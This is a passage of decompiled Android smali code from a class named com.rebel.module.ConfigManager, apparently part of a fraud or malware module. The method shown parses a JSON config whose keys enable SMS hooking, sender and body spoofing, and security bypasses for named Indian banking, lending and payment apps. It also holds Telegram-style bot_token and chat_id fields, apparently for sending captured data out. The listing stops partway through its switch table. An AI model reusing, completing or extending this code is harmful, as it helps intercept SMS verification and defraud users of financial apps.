    cmp-long v2, v2, v4

    if-gtz v2, :cond_0

    .line 523
    new-instance v2, Lcom/rebel/module/ConfigManager$ConfigData;

    invoke-direct {v2, v0}, Lcom/rebel/module/ConfigManager$ConfigData;-><init>(Lcom/rebel/module/ConfigManager$ConfigData;)V

    return-object v2

    .line 525
    :cond_0
    iget-object v2, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 527
    :try_start_0
    iget-object v2, p0, Lcom/rebel/module/ConfigManager;->configCache:Ljava/util/concurrent/atomic/AtomicReference;

    invoke-virtual {v2}, Ljava/util/concurrent/atomic/AtomicReference;->get()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/rebel/module/ConfigManager$ConfigData;

    .line 528
    .local v2, "configData2":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-boolean v3, p0, Lcom/rebel/module/ConfigManager;->cacheValid:Z

    if-eqz v3, :cond_1

    if-eqz v2, :cond_1

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 529
    invoke-virtual {v1}, Ljava/io/File;->lastModified()J

    move-result-wide v3

    iget-wide v5, p0, Lcom/rebel/module/ConfigManager;->lastFileModified:J

    cmp-long v3, v3, v5

    if-gtz v3, :cond_1

    .line 530
    new-instance v3, Lcom/rebel/module/ConfigManager$ConfigData;

    invoke-direct {v3, v2}, Lcom/rebel/module/ConfigManager$ConfigData;-><init>(Lcom/rebel/module/ConfigManager$ConfigData;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    .line 692
    iget-object v4, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v4}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v4

    invoke-virtual {v4}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 530
    return-object v3

    .line 532
    :cond_1
    :try_start_1
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v3

    const/4 v4, 0x1

    if-eqz v3, :cond_5

    invoke-virtual {v1}, Ljava/io/File;->canRead()Z

    move-result v3

    if-nez v3, :cond_2

    goto/16 :goto_6

    .line 539
    :cond_2
    new-instance v3, Lcom/rebel/module/ConfigManager$ConfigData;

    invoke-direct {v3}, Lcom/rebel/module/ConfigManager$ConfigData;-><init>()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_2

    .line 541
    .local v3, "configData4":Lcom/rebel/module/ConfigManager$ConfigData;
    :try_start_2
    new-instance v5, Landroid/util/JsonReader;

    new-instance v6, Ljava/io/FileReader;

    invoke-direct {v6, v1}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v5, v6}, Landroid/util/JsonReader;-><init>(Ljava/io/Reader;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 543
    .local v5, "jsonReader":Landroid/util/JsonReader;
    :try_start_3
    invoke-virtual {v5}, Landroid/util/JsonReader;->beginObject()V

    .line 544
    :goto_0
    invoke-virtual {v5}, Landroid/util/JsonReader;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_4

    .line 545
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextName()Ljava/lang/String;

    move-result-object v6

    .line 546
    .local v6, "nextName":Ljava/lang/String;
    invoke-virtual {v6}, Ljava/lang/String;->hashCode()I

    move-result v7

    sparse-switch v7, :sswitch_data_0

    :cond_3
    goto/16 :goto_1

    :sswitch_0
    const-string v7, "fix_phonepe"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x17

    goto/16 :goto_2

    :sswitch_1
    const-string v7, "bot_token"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/4 v7, 0x3

    goto/16 :goto_2

    :sswitch_2
    const-string v7, "fix_kreditbee"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x18

    goto/16 :goto_2

    :sswitch_3
    const-string v7, "yesbank_bypass"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x1b

    goto/16 :goto_2

    :sswitch_4
    const-string v7, "timer_multiplier"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x15

    goto/16 :goto_2

    :sswitch_5
    const-string v7, "blacklist"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0xf

    goto/16 :goto_2

    :sswitch_6
    const-string v7, "isLoggedIn"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0xb

    goto/16 :goto_2

    :sswitch_7
    const-string v7, "spoof_body"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x11

    goto/16 :goto_2

    :sswitch_8
    const-string v7, "footer_text"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x13

    goto/16 :goto_2

    :sswitch_9
    const-string v7, "chat_id"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/4 v7, 0x4

    goto/16 :goto_2

    :sswitch_a
    const-string v7, "zet_security_bypass"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x20

    goto/16 :goto_2

    :sswitch_b
    const-string v7, "fix_airtel"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x27

    goto/16 :goto_2

    :sswitch_c
    const-string v7, "fix_groww"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x22

    goto/16 :goto_2

    :sswitch_d
    const-string v7, "number_prefix"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x19

    goto/16 :goto_2

    :sswitch_e
    const-string v7, "sender_id"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/4 v7, 0x5

    goto/16 :goto_2

    :sswitch_f
    const-string v7, "smart_token"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x1a

    goto/16 :goto_2

    :sswitch_10
    const-string v7, "sms_sender"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/4 v7, 0x7

    goto/16 :goto_2

    :sswitch_11
    const-string v7, "sms_mobile"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x9

    goto/16 :goto_2

    :sswitch_12
    const-string v7, "zet_upi"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x1e

    goto/16 :goto_2

    :sswitch_13
    const-string v7, "fix_zagg"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x26

    goto/16 :goto_2

    :sswitch_14
    const-string v7, "fix_navi"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x16

    goto/16 :goto_2

    :sswitch_15
    const-string v7, "fix_esaf"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x24

    goto/16 :goto_2

    :sswitch_16
    const-string v7, "sms_hooking_2"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x1c

    goto/16 :goto_2

    :sswitch_17
    const-string v7, "hook_sms"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/4 v7, 0x0

    goto/16 :goto_2

    :sswitch_18
    const-string v7, "verification_delay"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x14

    goto/16 :goto_2

    :sswitch_19
    const-string v7, "zet_src_prefix"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x1f

    goto/16 :goto_2

    :sswitch_1a
    const-string v7, "fix_zet"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x1d

    goto/16 :goto_2

    :sswitch_1b
    const-string v7, "groww_mobile_no"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x23

    goto/16 :goto_2

    :sswitch_1c
    const-string v7, "isRoot"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0xa

    goto/16 :goto_2

    :sswitch_1d
    const-string v7, "spoof_direction"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/4 v7, 0x2

    goto/16 :goto_2

    :sswitch_1e
    const-string v7, "registred_id"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0xc

    goto/16 :goto_2

    :sswitch_1f
    const-string v7, "supermoney_bypass"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x21

    goto :goto_2

    :sswitch_20
    const-string v7, "spoof_sender"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    move v7, v4

    goto :goto_2

    :sswitch_21
    const-string v7, "whitelist"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0xe

    goto :goto_2

    :sswitch_22
    const-string v7, "whitelist_mode"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x10

    goto :goto_2

    :sswitch_23
    const-string v7, "spoof_preset"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x12

    goto :goto_2

    :sswitch_24
    const-string v7, "spoof_mobile"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x8

    goto :goto_2

    :sswitch_25
    const-string v7, "exp_date"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0xd

    goto :goto_2

    :sswitch_26
    const-string v7, "fix_esaf_native"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/16 v7, 0x25

    goto :goto_2

    :sswitch_27
    const-string v7, "gms_sender"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    const/4 v7, 0x6

    goto :goto_2

    :goto_1
    const/4 v7, -0x1

    :goto_2
    packed-switch v7, :pswitch_data_0

    .line 669
    invoke-virtual {v5}, Landroid/util/JsonReader;->skipValue()V

    goto/16 :goto_3

    .line 665
    :pswitch_0
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->fix_airtel:Z

    .line 666
    goto/16 :goto_3

    .line 662
    :pswitch_1
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->fix_zagg:Z

    .line 663
    goto/16 :goto_3

    .line 659
    :pswitch_2
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->fix_esaf_native:Z

    .line 660
    goto/16 :goto_3

    .line 656
    :pswitch_3
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->fix_esaf:Z

    .line 657
    goto/16 :goto_3

    .line 653
    :pswitch_4
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->groww_mobile_no:Ljava/lang/String;

    .line 654
    goto/16 :goto_3

    .line 650
    :pswitch_5
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->fix_groww:Z

    .line 651
    goto/16 :goto_3

    .line 647
    :pswitch_6
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->supermoney_bypass:Z

    .line 648
    goto/16 :goto_3

    .line 644
    :pswitch_7
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->zet_security_bypass:Z

    .line 645
    goto/16 :goto_3

    .line 641
    :pswitch_8
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->zet_src_prefix:Z

    .line 642
    goto/16 :goto_3

    .line 638
    :pswitch_9
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->zet_upi:Z

    .line 639
    goto/16 :goto_3

    .line 635
    :pswitch_a
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->fix_zet:Z

    .line 636
    goto/16 :goto_3

    .line 632
    :pswitch_b
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->sms_hooking_2:Z

    .line 633
    goto/16 :goto_3

    .line 629
    :pswitch_c
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->yesbank_bypass:Z

    .line 630
    goto/16 :goto_3

    .line 626
    :pswitch_d
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->smart_token:Z

    .line 627
    goto/16 :goto_3

    .line 623
    :pswitch_e
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->number_prefix:Ljava/lang/String;

    .line 624
    goto/16 :goto_3

    .line 620
    :pswitch_f
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->fix_kreditbee:Z

    .line 621
    goto/16 :goto_3

    .line 617
    :pswitch_10
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->fix_phonepe:Z

    .line 618
    goto/16 :goto_3

    .line 614
    :pswitch_11
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->fix_navi:Z

    .line 615
    goto/16 :goto_3

    .line 611
    :pswitch_12
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextInt()I

    move-result v7

    iput v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->timer_multiplier:I

    .line 612
    goto/16 :goto_3

    .line 608
    :pswitch_13
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextInt()I

    move-result v7

    iput v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->verification_delay:I

    .line 609
    goto/16 :goto_3

    .line 605
    :pswitch_14
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->footer_text:Ljava/lang/String;

    .line 606
    goto/16 :goto_3

    .line 602
    :pswitch_15
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_preset:Ljava/lang/String;

    .line 603
    goto/16 :goto_3

    .line 599
    :pswitch_16
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_body:Ljava/lang/String;

    .line 600
    goto/16 :goto_3

    .line 596
    :pswitch_17
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->whitelist_mode:Z

    .line 597
    goto/16 :goto_3

    .line 593
    :pswitch_18
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->blacklist:Ljava/lang/String;

    .line 594
    goto/16 :goto_3

    .line 590
    :pswitch_19
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->whitelist:Ljava/lang/String;

    .line 591
    goto :goto_3

    .line 587
    :pswitch_1a
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->exp_date:Ljava/lang/String;

    .line 588
    goto :goto_3

    .line 584
    :pswitch_1b
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->registred_id:Ljava/lang/String;

    .line 585
    goto :goto_3

    .line 581
    :pswitch_1c
    invoke-virtual {v5}, Landroid/util/JsonReader;->skipValue()V

    .line 582
    goto :goto_3

    .line 578
    :pswitch_1d
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->isRoot:Ljava/lang/String;

    .line 579
    goto :goto_3

    .line 575
    :pswitch_1e
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->mobile_no:Ljava/lang/String;

    .line 576
    goto :goto_3

    .line 572
    :pswitch_1f
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_mobile:Z

    .line 573
    goto :goto_3

    .line 569
    :pswitch_20
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->sms_sender:Z

    .line 570
    goto :goto_3

    .line 566
    :pswitch_21
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->gms_sender:Z

    .line 567
    goto :goto_3

    .line 563
    :pswitch_22
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->sender_id:Ljava/lang/String;

    .line 564
    goto :goto_3

    .line 560
    :pswitch_23
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->chat_id:Ljava/lang/String;

    .line 561
    goto :goto_3

    .line 557
    :pswitch_24
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->bot_token:Ljava/lang/String;

    .line 558
    goto :goto_3

    .line 554
    :pswitch_25
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_direction:Z

    .line 555
    goto :goto_3

    .line 551
    :pswitch_26
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_sender:Z

    .line 552
    goto :goto_3

    .line 548
    :pswitch_27
    invoke-virtual {v5}, Landroid/util/JsonReader;->nextBoolean()Z

    move-result v7

    iput-boolean v7, v3, Lcom/rebel/module/ConfigManager$ConfigData;->hook_sms:Z

    .line 549
    nop

    .line 672
    .end local v6    # "nextName":Ljava/lang/String;
    :goto_3
    goto/16 :goto_0

    .line 673
    :cond_4
    invoke-virtual {v5}, Landroid/util/JsonReader;->endObject()V

    .line 674
    invoke-virtual {v5}, Landroid/util/JsonReader;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 682
    nop

    .line 686
    .end local v5    # "jsonReader":Landroid/util/JsonReader;
    goto :goto_5

    .line 675
    .restart local v5    # "jsonReader":Landroid/util/JsonReader;
    :catchall_0
    move-exception v6

    .line 677
    .local v6, "th":Ljava/lang/Throwable;
    :try_start_4
    invoke-virtual {v5}, Landroid/util/JsonReader;->close()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 680
    goto :goto_4

    .line 678
    :catchall_1
    move-exception v7

    .line 679
    .local v7, "th2":Ljava/lang/Throwable;
    :try_start_5
    invoke-virtual {v6, v7}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .line 681
    .end local v7    # "th2":Ljava/lang/Throwable;
    :goto_4
    nop

    .end local v0    # "configData":Lcom/rebel/module/ConfigManager$ConfigData;
    .end local v1    # "file":Ljava/io/File;
    .end local v2    # "configData2":Lcom/rebel/module/ConfigManager$ConfigData;
    .end local v3    # "configData4":Lcom/rebel/module/ConfigManager$ConfigData;
    throw v6
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    .line 683
    .end local v5    # "jsonReader":Landroid/util/JsonReader;
    .end local v6    # "th":Ljava/lang/Throwable;
    .restart local v0    # "configData":Lcom/rebel/module/ConfigManager$ConfigData;
    .restart local v1    # "file":Ljava/io/File;
    .restart local v2    # "configData2":Lcom/rebel/module/ConfigManager$ConfigData;
    .restart local v3    # "configData4":Lcom/rebel/module/ConfigManager$ConfigData;
    :catch_0
    move-exception v5

    .line 687
    :goto_5
    :try_start_6
    iget-object v5, p0, Lcom/rebel/module/ConfigManager;->configCache:Ljava/util/concurrent/atomic/AtomicReference;

    new-instance v6, Lcom/rebel/module/ConfigManager$ConfigData;

    invoke-direct {v6, v3}, Lcom/rebel/module/ConfigManager$ConfigData;-><init>(Lcom/rebel/module/ConfigManager$ConfigData;)V

    invoke-virtual {v5, v6}, Ljava/util/concurrent/atomic/AtomicReference;->set(Ljava/lang/Object;)V

    .line 688
    iput-boolean v4, p0, Lcom/rebel/module/ConfigManager;->cacheValid:Z

    .line 689
    invoke-virtual {v1}, Ljava/io/File;->lastModified()J

    move-result-wide v4

    iput-wide v4, p0, Lcom/rebel/module/ConfigManager;->lastFileModified:J
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_2

    .line 690
    nop

    .line 692
    iget-object v4, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v4}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v4

    invoke-virtual {v4}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 690
    return-object v3

    .line 533
    .end local v3    # "configData4":Lcom/rebel/module/ConfigManager$ConfigData;
    :cond_5
    :goto_6
    :try_start_7
    new-instance v3, Lcom/rebel/module/ConfigManager$ConfigData;

    invoke-direct {v3}, Lcom/rebel/module/ConfigManager$ConfigData;-><init>()V

    .line 534
    .local v3, "configData3":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v5, p0, Lcom/rebel/module/ConfigManager;->configCache:Ljava/util/concurrent/atomic/AtomicReference;

    new-instance v6, Lcom/rebel/module/ConfigManager$ConfigData;

    invoke-direct {v6, v3}, Lcom/rebel/module/ConfigManager$ConfigData;-><init>(Lcom/rebel/module/ConfigManager$ConfigData;)V

    invoke-virtual {v5, v6}, Ljava/util/concurrent/atomic/AtomicReference;->set(Ljava/lang/Object;)V

    .line 535
    iput-boolean v4, p0, Lcom/rebel/module/ConfigManager;->cacheValid:Z

    .line 536
    const-wide/16 v4, 0x0

    iput-wide v4, p0, Lcom/rebel/module/ConfigManager;->lastFileModified:J
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_2

    .line 537
    nop

    .line 692
    iget-object v4, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v4}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v4

    invoke-virtual {v4}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 537
    return-object v3

    .line 692
    .end local v2    # "configData2":Lcom/rebel/module/ConfigManager$ConfigData;
    .end local v3    # "configData3":Lcom/rebel/module/ConfigManager$ConfigData;
    :catchall_2
    move-exception v2

    iget-object v3, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v3}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 693
    throw v2

    nop

    :sswitch_data_0
    .sparse-switch
        -0x7fb8f999 -> :sswitch_27
        -0x76b3f8a7 -> :sswitch_26
        -0x73b51770 -> :sswitch_25
        -0x6c2de568 -> :sswitch_24
        -0x66e3932b -> :sswitch_23
        -0x652e3965 -> :sswitch_22
        -0x6293bfb9 -> :sswitch_21
        -0x62785bd5 -> :sswitch_20
        -0x53dcffbe -> :sswitch_1f
        -0x504b2581 -> :sswitch_1e
        -0x4f904e37 -> :sswitch_1d
        -0x4657a2d4 -> :sswitch_1c
        -0x42ca2d3d -> :sswitch_1b
        -0x324f8081 -> :sswitch_1a
        -0x2eaecb5d -> :sswitch_19
        -0x1e9d4da1 -> :sswitch_18
        -0x193767c3 -> :sswitch_17
        -0x17ae6794 -> :sswitch_16
        -0x17a9e8c3 -> :sswitch_15
        -0x17a61270 -> :sswitch_14
